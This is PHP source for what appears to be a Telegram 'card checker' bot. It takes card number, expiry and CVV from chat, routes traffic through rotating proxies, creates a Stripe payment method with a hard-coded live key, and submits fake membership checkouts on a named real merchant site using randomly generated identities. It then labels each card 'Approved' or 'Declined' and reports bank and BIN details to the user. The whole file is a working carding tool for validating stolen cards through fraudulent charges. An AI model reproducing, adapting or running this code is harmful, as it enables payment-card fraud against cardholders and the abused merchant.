<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

ini_set('log_errors', TRUE);
ini_set('error_log', 'errors.log');
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
$rank = "FREE";
$expiryDate = "0";

$paidUsers = file('Database/Premium.txt', FILE_IGNORE_NEW_LINES);
$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

if (in_array($userId, $owners)) {
    $rank = "OWNER";
    $expiryDate = "UNTIL DEAD";
} else {
    foreach ($paidUsers as $index => $line) {
        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
        if ($userIdFromFile == $userId) {
            if ($userExpiryDate < $currentDate) {
                unset($paidUsers[$index]); //
                file_put_contents('Database/Premium.txt', implode("\n", $paidUsers));
                $freeUsers[] = $userId; // add to free users list
                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
            } else    $currentDate = date('Y-m-d');
            $rank = "FREE";
            $expiryDate = "0";

            $paidUsers = file('Database/Premium.txt', FILE_IGNORE_NEW_LINES);
            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

            if (in_array($userId, $owners)) {
                $rank = "OWNER";
                $expiryDate = "UNTIL DEAD";
            } else {
                foreach ($paidUsers as $index => $line) {
                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                    if ($userIdFromFile == $userId) {
                        if ($userExpiryDate < $currentDate) {
                            unset($paidUsers[$index]);
                            file_put_contents('Database/Premium.txt', implode("\n", $paidUsers));
                            $freeUsers[] = $userId;
                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                        } else {
                            $rank = "Premium";
                            $expiryDate = $userExpiryDate;
                        }
                    }
                }
            } {
                $rank = "Premium";
                $expiryDate = $userExpiryDate;
            }
        }
    }
}

  //=======RANK DETERMINE END=========//
  $update = json_decode(file_get_contents("php://input"), TRUE);
  $text = $update["message"]["text"];
  //========WHO CAN CHECK FUNC========//

  //=====WHO CAN CHECK FUNC END======//
  if (preg_match('/^(\/str|\.str|!str)/', $text)) {
      $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
        exit();
    }
  $start_time = microtime(true);

    $chatId = $update["message"]["chat"]["id"];
      $message_id = $update["message"]["message_id"];
      $keyboard = "";

  //=======WHO CAN CHECK END========//

  //====ANTISPAM AND WRONG FORMAT====//
      if (strlen($message) <= 4) {
              sendMessage($chatId, '<b>• Wrong Format! ⚠️</b>%0A• 𝘚𝘦𝘯𝘥 <code>/str cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code>Stripe Charge 12€</code>', $message_id);
              exit();
    }
  $r = "0";

  $r = rand(0, 100);
  //==ANTISPAM AND WRONG FORMAT END==//


  //=======checker part start========//
  if ($_SERVER['REQUEST_METHOD'] == "POST") {
      extract($_POST);
  } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
      extract($_GET);
  }
  function inStr($string, $start, $end, $value) {
      $str = explode($start, $string);
      $str = explode($end, $str[$value]);
      return $str[0];
  }


  $lista = substr($message, 5);
  $separa = explode("|", $lista);
  $cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
  $mes = isset($separa[1]) ? $separa[1] : '';
  $ano = isset($separa[2]) ? $separa[2] : '';
  $cvv = isset($separa[3]) ? $separa[3] : '';


  $last4 = substr($cc, -4);


  $sent_message_id = send_reply($chatId, $message_id, $keyboard, "  [ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ] ↯ [<code>⬛</code>]

𝗖𝗮𝗿𝗱 ↯ <code>$lista</code>
𝗦𝘁𝗮𝘁𝘂𝘀 ↯ <code>■□□□□ 20%[<code>⬛</code>]</code>
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ↯ <code>Stripe 12€ Charge</code>

𝗥𝗲𝗾 𝗕𝘆 ↯ <code>@$username</code> [$rank]
$botu");

  function value($str,$find_start,$find_end)
  {
      $start = @strpos($str,$find_start);
      if ($start === false) 
      {
          return "";
      }
      $length = strlen($find_start);
      $end    = strpos(substr($str,$start +$length),$find_end);
      return trim(substr($str,$start +$length,$end));
  }

  function mod($dividendo,$divisor)
  {
      return round($dividendo - (floor($dividendo/$divisor)*$divisor));
  }
  //================[Functions and Variables]================//
  #------[Email Generator]------#



  function emailGenerate($length = 10)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString . '@gmail.com';
  }
  $email = emailGenerate();
  #------[Username Generator]------#
  function usernameGen($length = 13)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
  }
  $un = usernameGen();
  #------[Password Generator]------#
  function passwordGen($length = 15)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
  }
  $pass = passwordGen();

  #------[CC Type Randomizer]------#

   $cardNames = array(
      "3" => "American Express",
      "4" => "Visa",
      "5" => "MasterCard",
      "6" => "Discover"
   );
   $card_type = $cardNames[substr($cc, 0, 1)];




  sleep(1);
      edit_sent_message($chatId, $sent_message_id, "  [ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ] ↯ [<code>🟥</code>]

𝗖𝗮𝗿𝗱 ↯ <code>$lista</code>
𝗦𝘁𝗮𝘁𝘂𝘀 ↯ <code>■■□□□ 40%[<code>🟥</code>]</code>
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ↯ <code>Stripe 12€ Charge</code>

𝗥𝗲𝗾 𝗕𝘆 ↯ <code>@$username</code> [$rank]
$botu");

    //==================[Randomizing Details]======================//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIE, 1); 
  curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  $resposta = curl_exec($ch);
  $firstname = value($resposta, '"first":"', '"');
  $lastname = value($resposta, '"last":"', '"');
  $phone = value($resposta, '"phone":"', '"');
  $zip = value($resposta, '"postcode":', ',');
  $postcode = value($resposta, '"postcode":', ',');
  $state = value($resposta, '"state":"', '"');
  $city = value($resposta, '"city":"', '"');
  $street = value($resposta, '"street":"', '"');
  $numero1 = substr($phone, 1,3);
  $numero2 = substr($phone, 6,3);
  $numero3 = substr($phone, 10,4);
  $num = $numero1.''.$numero2.''.$numero3;
  $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
  $serv_rnd = $serve_arr[array_rand($serve_arr)];
  $email= str_replace("example.com", $serv_rnd, $email);
  if($state=="Alabama"){ $state="AL";
  }else if($state=="alaska"){ $state="AK";
  }else if($state=="arizona"){ $state="AR";
  }else if($state=="california"){ $state="CA";
  }else if($state=="olorado"){ $state="CO";
  }else if($state=="connecticut"){ $state="CT";
  }else if($state=="delaware"){ $state="DE";
  }else if($state=="district of columbia"){ $state="DC";
  }else if($state=="florida"){ $state="FL";
  }else if($state=="georgia"){ $state="GA";
  }else if($state=="hawaii"){ $state="HI";
  }else if($state=="idaho"){ $state="ID";
  }else if($state=="illinois"){ $state="IL";
  }else if($state=="indiana"){ $state="IN";
  }else if($state=="iowa"){ $state="IA";
  }else if($state=="kansas"){ $state="KS";
  }else if($state=="kentucky"){ $state="KY";
  }else if($state=="louisiana"){ $state="LA";
  }else if($state=="maine"){ $state="ME";
  }else if($state=="maryland"){ $state="MD";
  }else if($state=="massachusetts"){ $state="MA";
  }else if($state=="michigan"){ $state="MI";
  }else if($state=="minnesota"){ $state="MN";
  }else if($state=="mississippi"){ $state="MS";
  }else if($state=="missouri"){ $state="MO";
  }else if($state=="montana"){ $state="MT";
  }else if($state=="nebraska"){ $state="NE";
  }else if($state=="nevada"){ $state="NV";
  }else if($state=="new hampshire"){ $state="NH";
  }else if($state=="new jersey"){ $state="NJ";
  }else if($state=="new mexico"){ $state="NM";
  }else if($state=="new york"){ $state="LA";
  }else if($state=="north carolina"){ $state="NC";
  }else if($state=="north dakota"){ $state="ND";
  }else if($state=="Ohio"){ $state="OH";
  }else if($state=="oklahoma"){ $state="OK";
  }else if($state=="oregon"){ $state="OR";
  }else if($state=="pennsylvania"){ $state="PA";
  }else if($state=="rhode Island"){ $state="RI";
  }else if($state=="south carolina"){ $state="SC";
  }else if($state=="south dakota"){ $state="SD";
  }else if($state=="tennessee"){ $state="TN";
  }else if($state=="texas"){ $state="TX";
  }else if($state=="utah"){ $state="UT";
  }else if($state=="vermont"){ $state="VT";
  }else if($state=="virginia"){ $state="VA";
  }else if($state=="washington"){ $state="WA";
  }else if($state=="west virginia"){ $state="WV";
  }else if($state=="wisconsin"){ $state="WI";
  }else if($state=="wyoming"){ $state="WY";
  }else{$state="KY";} 

  //==============[Randomizing Details-END]======================//
  sleep(1);
      edit_sent_message($chatId, $sent_message_id, "  [ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ] ↯ [<code>🟧</code>]

𝗖𝗮𝗿𝗱 ↯ <code>$lista</code>
𝗦𝘁𝗮𝘁𝘂𝘀 ↯ <code>■■■□□ 60%[<code>🟧</code>]</code>
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ↯ <code>Stripe 12€ Charge</code>

𝗥𝗲𝗾 𝗕𝘆 ↯ <code>@$username</code> [$rank]
$botu");


    //==================[BIN LOOK-UP]======================//

    $bin = substr($lista, 0,6);
    $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: lookup.binlist.net',
  'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
  $fim = curl_exec($ch);
  $bank = GetStr($fim, '"bank":{"name":"', '"');
  $name = strtoupper(GetStr($fim, '"name":"', '"'));
  $brand = strtoupper(GetStr($fim, '"brand":"', '"'));
  $country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
  $scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
  $emoji = GetStr($fim, '"emoji":"', '"');
  $type =strtoupper(GetStr($fim, '"type":"', '"'));
     //IF BIN ARE NOT AVAILABLE ----//
      if (empty($scheme)) {
          $scheme = "N/A";
      }
      if (empty($type)) {
          $type = "N/A";
      }
      if (empty($brand)) {
          $brand = "N/A";
      }
      if (empty($bank)) {
          $bank = "N/A/N/A";
      }
      if (empty($name)) {
          $name = "N/A";
      }
      if (empty($emoji)) {
          $emoji = "N/A";
      }
      if (empty($currency)) {
          $currency = "N/A";
      }


  //==================[BIN LOOK-UP-END]======================//



  sleep(1);
      edit_sent_message($chatId, $sent_message_id, "  [ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ] ↯ [<code>🟨</code>]

𝗖𝗮𝗿𝗱 ↯ <code>$lista</code>
𝗦𝘁𝗮𝘁𝘂𝘀 ↯ <code>■■■■□ 80%[<code>🟨</code>]</code>
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ↯ <code>Stripe 12€ Charge</code>

𝗥𝗲𝗾 𝗕𝘆 ↯ <code>@$username</code> [$rank]
$botu");
  //=======================[5 REQ]==================================//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array();
  $headers[] = 'Host: api.stripe.com';
  $headers[] = 'Accept: application/json';
  $headers[] = 'Accept-Language: en-US,en;q=0.8';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Path: /v1/payment_methods';
  $headers[] = 'Origin: https://js.stripe.com';
  $headers[] = 'Referer: https://js.stripe.com/';
  $headers[] = 'sec-ch-ua: "Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"';
  $headers[] = 'sec-ch-ua-mobile: ?0';
  $headers[] = 'sec-ch-ua-platform: "Windows"';
  $headers[] = 'Sec-Fetch-Dest: empty';
  $headers[] = 'Sec-Fetch-Mode: cors';
  $headers[] = 'Sec-Fetch-Site: same-site';
  $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e6de2d6e-b274-4446-bf7c-2ddc40b41aea5641ba&muid=5b822e84-caae-41de-8a32-c54d05c25b9e3ef89a&sid=69a97df0-8b95-4902-9eab-80f20f1758e24e759d&pasted_fields=number&payment_user_agent=stripe.js%2F7e8ee2cfca%3B+stripe-js-v3%2F7e8ee2cfca%3B+split-card-element&referrer=https%3A%2F%2Fwww.yasminmogahedtv.com&time_on_page=79353&key=pk_live_51HdbmyHNc8MTJAaGytBzUdQLnsyVtugsmpGoxyN6NwE9ip5CsvYgmwAgxB5JBcyGnORmoxbtZzdvMl4AN6TwejOX00t0lGfzmO');

  $result1 = curl_exec($ch);
  $id = trim(strip_tags(getStr($result1,'"id": "','"')));
  $brandi = trim(strip_tags(getStr($result1,'"brand": "','"')));

  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

  //==================req 1 end===============//
  //==================req 2===============//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://www.yasminmogahedtv.com/membership-account/membership-checkout/');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
              curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array(
    'authority: www.yasminmogahedtv.com',
    'method: POST',
    'path: /membership-account/membership-checkout/ HTTP/1.1',
    'scheme: https',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
    'cnntent-Type: application/x-www-form-urlencoded',
    'cookie: PHPSESSID=qcpqv2lku3sqateclj8lh93bb0; pmpro_visit=1; __stripe_mid=5b822e84-caae-41de-8a32-c54d05c25b9e3ef89a; __stripe_sid=69a97df0-8b95-4902-9eab-80f20f1758e24e759d',
    'origin: https://www.yasminmogahedtv.com',
    'referer: https://www.yasminmogahedtv.com/membership-account/membership-checkout/',
    'sec-Fetch-Dest: document',
    'sec-Fetch-Mode: navigate',
    'sec-Fetch-Site: same-origin',
    'user-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    );


  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=4&checkjavascript=1&other_discount_code=&username='.$un.'&password='.$un.'834&password2='.$un.'834&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&telephone=%2B95+9787786963&CardType='.$brandi.'&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$last4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');


  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

  $result2 = curl_exec($ch);
  $msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

  //==================req 2 end===============//



  sleep(1);
      edit_sent_message($chatId, $sent_message_id, "  [ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ] ↯ [<code>🟩</code>]

𝗖𝗮𝗿𝗱 ↯ <code>$lista</code>
𝗦𝘁𝗮𝘁𝘂𝘀 ↯ <code>■■■■■ 100%[<code>🟩</code>]</code>
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ↯ <code>Stripe 12€ Charge</code>

𝗥𝗲𝗾 𝗕𝘆 ↯ <code>@$username</code> [$rank]
$botu");
  $end_time = microtime(true);
  $time = number_format($end_time - $start_time, 2);

    //======checker part end=========//


  if (
      strpos($result2, 'Thank you for your membership.') !== false ||
      strpos($result2, "Membership Confirmation") !== false ||
      strpos($result2, 'Your card zip code is incorrect.') !== false ||
      strpos($result2, "Thank You For Donation.") !== false ||
      strpos($result2, "incorrect_zip") !== false ||
      strpos($result2, "Success ") !== false ||
      strpos($result2, '"type":"one-time"') !== false ||
      strpos($result2, "/donations/thank_you?donation_number=") !== false
  ) {
    $resp = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Stripe 12€</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>12€ Charge Successfully 🟢</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$type - $brand - $scheme</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$name $emoji</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";
  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif (
      strpos($result2, 'Error updating default payment method.Your card does not support this type of purchase.') !== false ||
      strpos($result2, "Your card does not support this type of purchase.") !== false ||
      strpos($result2, 'transaction_not_allowed') !== false ||
      strpos($result2, "insufficient_funds") !== false ||
      strpos($result2, "incorrect_zip") !== false ||
      strpos($result2, "Your card has insufficient funds.") !== false ||
      strpos($result2, '"status":"success"') !== false ||
      strpos($result2, "stripe_3ds2_fingerprint") !== false
  ) {
  $resp = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Stripe 12€</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>1000:Approved 🟢</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$type - $brand - $scheme</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$name $emoji</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif (
      strpos($result2, 'security code is incorrect.') !== false ||
      strpos($result2, 'security code is invalid.') !== false ||
      strpos($result2, "Your card's security code is incorrect.") !== false
  ) {
  $resp = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Stripe 12€</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg 🟢</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$type - $brand - $scheme</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$name $emoji</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif(strpos($result2, "Error updating default payment method. Your card was declined.")) {
  $resp = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Stripe 12€</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg 🔴</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$type - $brand - $scheme</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$name $emoji</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }

  elseif(strpos($result2, "Unknown error generating account. Please contact us to set up your membership.")) {
  $resp = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Stripe 12€</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg 🔴</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$type - $brand - $scheme</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$name $emoji</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }

  else {
  $resp = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Stripe 12€</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg 🔴</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$type - $brand - $scheme</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$name $emoji</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }
  }